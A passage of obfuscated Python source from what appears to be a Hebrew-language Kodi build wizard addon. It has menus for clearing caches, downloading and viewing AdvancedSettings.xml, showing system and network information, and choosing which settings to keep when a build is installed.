		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O00O00OOOOOOO00O0 .replace ('true',O0O00OOO0O000O000 ).replace ('false',OO00000000OOO0O0O ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2896
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2897
	addFile ('Include Video Cache in Clear Cache: %s'%OO0OOO0O0O0O00OO0 .replace ('true',O0O00OOO0O000O000 ).replace ('false',OO00000000OOO0O0O ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2898
	if OO0OOO0O0O0O00OO0 =='true':#line:2899
		addFile ('--- Include All Video Addons: %s'%OO0OO00OOOOO0O000 .replace ('true',O0O00OOO0O000O000 ).replace ('false',OO00000000OOO0O0O ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2900
		addFile ('--- Include Bob: %s'%O00000O0OOO0OOO00 .replace ('true',O0O00OOO0O000O000 ).replace ('false',OO00000000OOO0O0O ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2901
		addFile ('--- Include Phoenix: %s'%OO00OOO0OOOOO00OO .replace ('true',O0O00OOO0O000O000 ).replace ('false',OO00000000OOO0O0O ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2902
		addFile ('--- Include Specto: %s'%O00O00000OOO0O0O0 .replace ('true',O0O00OOO0O000O000 ).replace ('false',OO00000000OOO0O0O ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2903
		addFile ('--- Include Exodus: %s'%O0OOOOO00O0O000OO .replace ('true',O0O00OOO0O000O000 ).replace ('false',OO00000000OOO0O0O ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2904
		addFile ('--- Include Salts: %s'%OOO0OO000OO00O0O0 .replace ('true',O0O00OOO0O000O000 ).replace ('false',OO00000000OOO0O0O ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2905
		addFile ('--- Include Salts HD Lite: %s'%O0OO0O00O0OO0000O .replace ('true',O0O00OOO0O000O000 ).replace ('false',OO00000000OOO0O0O ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2906
		addFile ('--- Include One Channel: %s'%OO0000OOOO00O00O0 .replace ('true',O0O00OOO0O000O000 ).replace ('false',OO00000000OOO0O0O ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2907
		addFile ('--- Include Genesis: %s'%OO0O000000O00000O .replace ('true',O0O00OOO0O000O000 ).replace ('false',OO00000000OOO0O0O ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2908
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2909
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2910
	setView ('files','viewType')#line:2911
def advancedWindow (url =None ):#line:2913
	if not ADVANCEDFILE =='http://':#line:2914
		if url ==None :#line:2915
			O00O0O0O00OO00OOO =wiz .workingURL (ADVANCEDFILE )#line:2916
			O000OOO0OO00O00O0 =uservar .ADVANCEDFILE #line:2917
		else :#line:2918
			O00O0O0O00OO00OOO =wiz .workingURL (url )#line:2919
			O000OOO0OO00O00O0 =url #line:2920
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2921
		if os .path .exists (ADVANCED ):#line:2922
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2923
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2924
		if O00O0O0O00OO00OOO ==True :#line:2925
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2926
			OO000O000O0OOO000 =wiz .openURL (O000OOO0OO00O00O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2927
			OOO00OOO0O00000OO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO000O000O0OOO000 )#line:2928
			if len (OOO00OOO0O00000OO )>0 :#line:2929
				for OO0O0OO000O000000 ,OO0OO00000O00OO0O ,url ,OO00OO0O0OO0O00O0 ,O00OO0OO0O000OO00 ,O0O00O00OOOOOO0O0 in OOO00OOO0O00000OO :#line:2930
					if OO0OO00000O00OO0O .lower ()=="yes":#line:2931
						addDir ("[B]%s[/B]"%OO0O0OO000O000000 ,'advancedsetting',url ,description =O0O00O00OOOOOO0O0 ,icon =OO00OO0O0OO0O00O0 ,fanart =O00OO0OO0O000OO00 ,themeit =THEME3 )#line:2932
					else :#line:2933
						addFile (OO0O0OO000O000000 ,'writeadvanced',OO0O0OO000O000000 ,url ,description =O0O00O00OOOOOO0O0 ,icon =OO00OO0O0OO0O00O0 ,fanart =O00OO0OO0O000OO00 ,themeit =THEME2 )#line:2934
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2935
		else :wiz .log ("[Advanced Settings] URL not working: %s"%O00O0O0O00OO00OOO )#line:2936
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2937
def writeAdvanced (OOOO0O00000OOOOOO ,OOOO0OO000OOO0000 ):#line:2939
	OO00O0O0OO000O00O =wiz .workingURL (OOOO0OO000OOO0000 )#line:2940
	if OO00O0O0OO000O00O ==True :#line:2941
		if os .path .exists (ADVANCED ):O0O0O00OO0O0OOOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOOO0O00000OOOOOO ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2942
		else :O0O0O00OO0O0OOOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOOO0O00000OOOOOO ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2943
		if O0O0O00OO0O0OOOO0 ==1 :#line:2945
			O0OOO00O00O00OOOO =wiz .openURL (OOOO0OO000OOO0000 )#line:2946
			O0O00OO0OO0O0O0OO =open (ADVANCED ,'w');#line:2947
			O0O00OO0OO0O0O0OO .write (O0OOO00O00O00OOOO )#line:2948
			O0O00OO0OO0O0O0OO .close ()#line:2949
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2950
			wiz .killxbmc (True )#line:2951
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2952
	else :wiz .log ("[Advanced Settings] URL not working: %s"%OO00O0O0OO000O00O );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2953
def viewAdvanced ():#line:2955
	OOOO0O000O0O00O00 =open (ADVANCED )#line:2956
	O00000000O000O00O =OOOO0O000O0O00O00 .read ().replace ('\t','    ')#line:2957
	wiz .TextBox (ADDONTITLE ,O00000000O000O00O )#line:2958
	OOOO0O000O0O00O00 .close ()#line:2959
def removeAdvanced ():#line:2961
	if os .path .exists (ADVANCED ):#line:2962
		wiz .removeFile (ADVANCED )#line:2963
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2964
def showAutoAdvanced ():#line:2966
	notify .autoConfig ()#line:2967
def getIP ():#line:2969
	OOOO000O0O0OOOO00 ='http://whatismyipaddress.com/'#line:2970
	if not wiz .workingURL (OOOO000O0O0OOOO00 ):return 'Unknown','Unknown','Unknown'#line:2971
	O00OO0OOOOOOOOOOO =wiz .openURL (OOOO000O0O0OOOO00 ).replace ('\n','').replace ('\r','')#line:2972
	if not 'Access Denied'in O00OO0OOOOOOOOOOO :#line:2973
		O0O0O00OO00O0O000 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (O00OO0OOOOOOOOOOO )#line:2974
		OOOO00OOOOO00O0O0 =O0O0O00OO00O0O000 [0 ]if (len (O0O0O00OO00O0O000 )>0 )else 'Unknown'#line:2975
		OOOOOOO0O0OO0O000 =re .compile ('"font-size:14px;">(.+?)</td>').findall (O00OO0OOOOOOOOOOO )#line:2976
		OO0OOO0O0OO000OOO =OOOOOOO0O0OO0O000 [0 ]if (len (OOOOOOO0O0OO0O000 )>0 )else 'Unknown'#line:2977
		O0OOOO0O0OOO000O0 =OOOOOOO0O0OO0O000 [1 ]+', '+OOOOOOO0O0OO0O000 [2 ]+', '+OOOOOOO0O0OO0O000 [3 ]if (len (OOOOOOO0O0OO0O000 )>2 )else 'Unknown'#line:2978
		return OOOO00OOOOO00O0O0 ,OO0OOO0O0OO000OOO ,O0OOOO0O0OOO000O0 #line:2979
	else :return 'Unknown','Unknown','Unknown'#line:2980
def systemInfo ():#line:2982
	OO0000O0000O0OO00 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2996
	OO00OOOOOO00OOO0O =[];O0OO000OOOOOOO00O =0 #line:2997
	for OOOOOO0000000OO00 in OO0000O0000O0OO00 :#line:2998
		OOO0O00OO000OO00O =wiz .getInfo (OOOOOO0000000OO00 )#line:2999
		O00O0O0OO0O00OO00 =0 #line:3000
		while OOO0O00OO000OO00O =="Busy"and O00O0O0OO0O00OO00 <10 :#line:3001
			OOO0O00OO000OO00O =wiz .getInfo (OOOOOO0000000OO00 );O00O0O0OO0O00OO00 +=1 ;wiz .log ("%s sleep %s"%(OOOOOO0000000OO00 ,str (O00O0O0OO0O00OO00 )));xbmc .sleep (1000 )#line:3002
		OO00OOOOOO00OOO0O .append (OOO0O00OO000OO00O )#line:3003
		O0OO000OOOOOOO00O +=1 #line:3004
	OO00OOO0O0OO0O0OO =OO00OOOOOO00OOO0O [8 ]if 'Una'in OO00OOOOOO00OOO0O [8 ]else wiz .convertSize (int (float (OO00OOOOOO00OOO0O [8 ][:-8 ]))*1024 *1024 )#line:3005
	O00OOOOO0OOOO00OO =OO00OOOOOO00OOO0O [9 ]if 'Una'in OO00OOOOOO00OOO0O [9 ]else wiz .convertSize (int (float (OO00OOOOOO00OOO0O [9 ][:-8 ]))*1024 *1024 )#line:3006
	O0000O0O00O00000O =OO00OOOOOO00OOO0O [10 ]if 'Una'in OO00OOOOOO00OOO0O [10 ]else wiz .convertSize (int (float (OO00OOOOOO00OOO0O [10 ][:-8 ]))*1024 *1024 )#line:3007
	OOOO0OO0000OOO0O0 =wiz .convertSize (int (float (OO00OOOOOO00OOO0O [11 ][:-2 ]))*1024 *1024 )#line:3008
	O000O0O000O0OOOOO =wiz .convertSize (int (float (OO00OOOOOO00OOO0O [12 ][:-2 ]))*1024 *1024 )#line:3009
	OO00O0O0O000O000O =wiz .convertSize (int (float (OO00OOOOOO00OOO0O [13 ][:-2 ]))*1024 *1024 )#line:3010
	O000O0000OOO000O0 ,O0OO0O0000OO0OO0O ,O0OOO000O0O00O0O0 =getIP ()#line:3011
	OOOOOO00OOOOOOO00 =[];OOOO0O0O00OOO0OO0 =[];O00OO0O0O00OOOOOO =[];OO0O000OO0O0OOOO0 =[];O0OOOOOOOO000OOOO =[];O0OOO0OOO00O000OO =[];OO0O00O000O000OOO =[]#line:3013
	OO000OO000OO0O000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3015
	for O000000000O0O0000 in sorted (OO000OO000OO0O000 ,key =lambda OO00OO00000000OOO :OO00OO00000000OOO ):#line:3016
		OOOOOOOO0000O000O =os .path .split (O000000000O0O0000 [:-1 ])[1 ]#line:3017
		if OOOOOOOO0000O000O =='packages':continue #line:3018
		OOOO0O000OOO0OOO0 =os .path .join (O000000000O0O0000 ,'addon.xml')#line:3019
		if os .path .exists (OOOO0O000OOO0OOO0 ):#line:3020
			OOOOOO00000000O0O =open (OOOO0O000OOO0OOO0 )#line:3021
			O0OO0OO0OOOO00OOO =OOOOOO00000000O0O .read ()#line:3022
			O0O0O0OO0O0O0O0O0 =re .compile ("<provides>(.+?)</provides>").findall (O0OO0OO0OOOO00OOO )#line:3023
			if len (O0O0O0OO0O0O0O0O0 )==0 :#line:3024
				if OOOOOOOO0000O000O .startswith ('skin'):OO0O00O000O000OOO .append (OOOOOOOO0000O000O )#line:3025
				if OOOOOOOO0000O000O .startswith ('repo'):O0OOOOOOOO000OOOO .append (OOOOOOOO0000O000O )#line:3026
				else :O0OOO0OOO00O000OO .append (OOOOOOOO0000O000O )#line:3027
			elif not (O0O0O0OO0O0O0O0O0 [0 ]).find ('executable')==-1 :OO0O000OO0O0OOOO0 .append (OOOOOOOO0000O000O )#line:3028
			elif not (O0O0O0OO0O0O0O0O0 [0 ]).find ('video')==-1 :O00OO0O0O00OOOOOO .append (OOOOOOOO0000O000O )#line:3029
			elif not (O0O0O0OO0O0O0O0O0 [0 ]).find ('audio')==-1 :OOOO0O0O00OOO0OO0 .append (OOOOOOOO0000O000O )#line:3030
			elif not (O0O0O0OO0O0O0O0O0 [0 ]).find ('image')==-1 :OOOOOO00OOOOOOO00 .append (OOOOOOOO0000O000O )#line:3031
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3033
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OOOOOO00OOO0O [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3034
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OOOOOO00OOO0O [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3035
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3036
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OOOOOO00OOO0O [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3037
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OOOOOO00OOO0O [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3038
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3040
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OOOOOO00OOO0O [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3041
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OOOOOO00OOO0O [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3042
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3044
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OOO0O0OO0O0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3045
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOOOO0OOOO00OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3046
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000O0O00O00000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3047
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3049
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0OO0000OOO0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3050
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O0O000O0OOOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3051
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O0O0O000O000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3052
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3054
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OOOOOO00OOO0O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3055
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O0000OOO000O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3056
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0O0000OO0OO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3057
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO000O0O00O0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3058
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OOOOOO00OOO0O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3059
	O000OOO00O000OO0O =len (OOOOOO00OOOOOOO00 )+len (OOOO0O0O00OOO0OO0 )+len (O00OO0O0O00OOOOOO )+len (OO0O000OO0O0OOOO0 )+len (O0OOO0OOO00O000OO )+len (OO0O00O000O000OOO )+len (O0OOOOOOOO000OOOO )#line:3061
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,O000OOO00O000OO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3062
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00OO0O0O00OOOOOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3063
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0O000OO0O0OOOO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3064
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOO0O0O00OOO0OO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3065
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOOOO00OOOOOOO00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3066
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOOOOOOO000OOOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3067
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0O00O000O000OOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3068
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOO0OOO00O000OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3069
def Menu ():#line:3070
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3071
def saveMenu ():#line:3073
	OOOO0O00OO0OO0O0O ='[COLOR yellow]מופעל[/COLOR]';O0000OOOO0O00O00O ='[COLOR blue]מבוטל[/COLOR]'#line:3075
	O00O0000O0O0OO0OO ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3076
	OOO00O00OOO000OOO ='true'if KEEPMOVIELIST =='true'else 'false'#line:3077
	O000OO0OOO0OOO0O0 ='true'if KEEPINFO =='true'else 'false'#line:3078
	OO0O0OO00O0OO00O0 ='true'if KEEPSOUND =='true'else 'false'#line:3080
	O0OO0OOO000000000 ='true'if KEEPVIEW =='true'else 'false'#line:3081
	OO000O0OO0O000O0O ='true'if KEEPSKIN =='true'else 'false'#line:3082
	O0O0OO00OO000O0O0 ='true'if KEEPSKIN2 =='true'else 'false'#line:3083
	OOOO000OOO00O00OO ='true'if KEEPSKIN3 =='true'else 'false'#line:3084
	O00OOO000OO00OO00 ='true'if KEEPADDONS =='true'else 'false'#line:3085
	O0O0O00O0O0O0000O ='true'if KEEPPVR =='true'else 'false'#line:3086
	O00O0O0O000OOOO0O ='true'if KEEPTVLIST =='true'else 'false'#line:3087
	OO0O0OO00OOOOOOO0 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3088
	O0O0O000O0O0O0O0O ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3089
	OO000000O0O0000O0 ='true'if KEEPHUBTV =='true'else 'false'#line:3090
	OOO0O0O00O0O0OO0O ='true'if KEEPHUBVOD =='true'else 'false'#line:3091
	OOO000O000O0O00O0 ='true'if KEEPHUBSPORT =='true'else 'false'#line:3092
	OOO0O00OOOO0O00O0 ='true'if KEEPHUBKIDS =='true'else 'false'#line:3093
	OOO00OO0O0OOOOO00 ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3094
	OOOOOOO0OOO0O00O0 ='true'if KEEPHUBMENU =='true'else 'false'#line:3095
	O0000O0OOOO0OOOO0 ='true'if KEEPPLAYLIST =='true'else 'false'#line:3096
	OO00OOOO0OO0O0OO0 ='true'if KEEPTRAKT =='true'else 'false'#line:3097
	O0O0OOOO00000OOO0 ='true'if KEEPREAL =='true'else 'false'#line:3098
	O0O0OOOOOO000OOOO ='true'if KEEPRD2 =='true'else 'false'#line:3099
	O0O0O00OO0OOO000O ='true'if KEEPTORNET =='true'else 'true'#line:3100
	OO0OOOOOOOO00OO00 ='true'if KEEPLOGIN =='true'else 'false'#line:3101
	O00O00OOO00OOO000 ='true'if KEEPSOURCES =='true'else 'false'#line:3102
	O0O000OO0O000OO00 ='true'if KEEPADVANCED =='true'else 'false'#line:3103
	OO000OOOOOOO0OO00 ='true'if KEEPPROFILES =='true'else 'false'#line:3104
	OOOOO0OO000O00000 ='true'if KEEPFAVS =='true'else 'false'#line:3105
	OOO0O00OO000O0OOO ='true'if KEEPREPOS =='true'else 'false'#line:3106
	O000OOO00OO0OO0OO ='true'if KEEPSUPER =='true'else 'false'#line:3107
	O00O000OO0O0O0OOO ='true'if KEEPWHITELIST =='true'else 'false'#line:3108
	OOOOO0O000O0000O0 ='true'if KEEPWEATHER =='true'else 'false'#line:3109
	if O00O000OO0O0O0OOO =='true':#line:3113
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3114
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3115
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3116
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3117
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3118
	addFile ('%s התקנת קיר סרטים: '%O00O0000O0O0OO0OO .replace ('true',OOOO0O00OO0OO0O0O ).replace ('false',O0000OOOO0O00O00O ),'togglesetting','keepmoviewall',icon =ICONTRAKT ,themeit =THEME1 )#line:3120
	addFile ('%s שמירת חשבון RD:  '%O0O0OOOO00000OOO0 .replace ('true',OOOO0O00OO0OO0O0O ).replace ('false',O0000OOOO0O00O00O ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3121
	addFile ('%s שמירת חשבון טראקט:  '%OO00OOOO0OO0O0OO0 .replace ('true',OOOO0O00OO0OO0O0O ).replace ('false',O0000OOOO0O00O00O ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3122
	addFile ('%s שמירת מועדפים:  '%OOOOO0OO000O00000 .replace ('true',OOOO0O00OO0OO0O0O ).replace ('false',O0000OOOO0O00O00O ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3125
	addFile ('%s שמירת לקוח טלוויזיה:  '%O0O0O00O0O0O0000O .replace ('true',OOOO0O00OO0OO0O0O ).replace ('false',O0000OOOO0O00O00O ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3126
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%O00O0O0O000OOOO0O .replace ('true',OOOO0O00OO0OO0O0O ).replace ('false',O0000OOOO0O00O00O ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3127
	addFile ('%s שמירת אריח סרטים:  '%OO0O0OO00OOOOOOO0 .replace ('true',OOOO0O00OO0OO0O0O ).replace ('false',O0000OOOO0O00O00O ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3128
	addFile ('%s שמירת אריח סדרות:  '%O0O0O000O0O0O0O0O .replace ('true',OOOO0O00OO0OO0O0O ).replace ('false',O0000OOOO0O00O00O ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3129
	addFile ('%s שמירת אריח טלויזיה:  '%OO000000O0O0000O0 .replace ('true',OOOO0O00OO0OO0O0O ).replace ('false',O0000OOOO0O00O00O ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3130
	addFile ('%s שמירת אריח תוכן ישראלי:  '%OOO0O0O00O0O0OO0O .replace ('true',OOOO0O00OO0OO0O0O ).replace ('false',O0000OOOO0O00O00O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3131
	addFile ('%s שמירת אריח ספורט:  '%OOO000O000O0O00O0 .replace ('true',OOOO0O00OO0OO0O0O ).replace ('false',O0000OOOO0O00O00O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3132
	addFile ('%s שמירת אריח ילדים:  '%OOO0O00OOOO0O00O0 .replace ('true',OOOO0O00OO0OO0O0O ).replace ('false',O0000OOOO0O00O00O ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3133
	addFile ('%s שמירת אריח מוסיקה:  '%OOO00OO0O0OOOOO00 .replace ('true',OOOO0O00OO0OO0O0O ).replace ('false',O0000OOOO0O00O00O ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3134
	addFile ('%s שמירת תפריט אריחים ראשי:  '%OOOOOOO0OOO0O00O0 .replace ('true',OOOO0O00OO0OO0O0O ).replace ('false',O0000OOOO0O00O00O ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3135
	addFile ('%s שמירת כל האריחים בסקין:  '%OO000O0OO0O000O0O .replace ('true',OOOO0O00OO0OO0O0O ).replace ('false',O0000OOOO0O00O00O ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3136
	addFile ('%s שמירת הגדרות מזג האוויר:  '%OOOOO0O000O0000O0 .replace ('true',OOOO0O00OO0OO0O0O ).replace ('false',O0000OOOO0O00O00O ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3137
	addFile ('%s שמירת הרחבות שהתקנתי:  '%O00OOO000OO00OO00 .replace ('true',OOOO0O00OO0OO0O0O ).replace ('false',O0000OOOO0O00O00O ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3143
	addFile ('%s שמירת סיסמאות, חשבונות ,מיקומי הורדות:  '%O000OO0OOO0OOO0O0 .replace ('true',OOOO0O00OO0OO0O0O ).replace ('false',O0000OOOO0O00O00O ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3144
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%OOO00O00OOO000OOO .replace ('true',OOOO0O00OO0OO0O0O ).replace ('false',O0000OOOO0O00O00O ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3147
	addFile ('%s שמירת מקורות וידאו:  '%O00O00OOO00OOO000 .replace ('true',OOOO0O00OO0OO0O0O ).replace ('false',O0000OOOO0O00O00O ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3148
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%OO0O0OO00O0OO00O0 .replace ('true',OOOO0O00OO0OO0O0O ).replace ('false',O0000OOOO0O00O00O ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3149
